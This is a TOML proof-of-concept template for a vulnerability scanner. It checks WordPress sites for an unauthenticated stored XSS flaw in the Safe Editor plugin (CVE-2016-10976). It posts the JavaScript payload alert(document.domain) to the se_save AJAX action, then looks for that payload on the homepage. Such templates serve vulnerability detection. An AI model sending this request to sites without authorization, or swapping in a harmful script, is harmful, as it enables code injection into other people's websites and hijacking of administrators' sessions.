[info]
author = "ave"
description = "通过向未认证的 se_save AJAX 接口注入 JavaScript 载荷，验证 WordPress Safe Editor 插件 1.2 版本之前是否存在存储型 XSS 漏洞。攻击者无需认证即可注入恶意 JS/CSS 代码，当管理员访问受影响页面时触发执行。"
id = "POC-AVE-2016-0052"
name = "WordPress Safe Editor Plugin < 1.2 XSS PoC"
severity = "medium"
tags = ["ave-2016-0052"]
vuln_id = [
    "CVE-2016-10976",
    "AVE-2016-0052",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
protocol = "http"

[poc.requests.body]
content = "action=se_save&type=js&data=alert(document.domain)"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "alert(document.domain)",
    "save_edit_js",
]
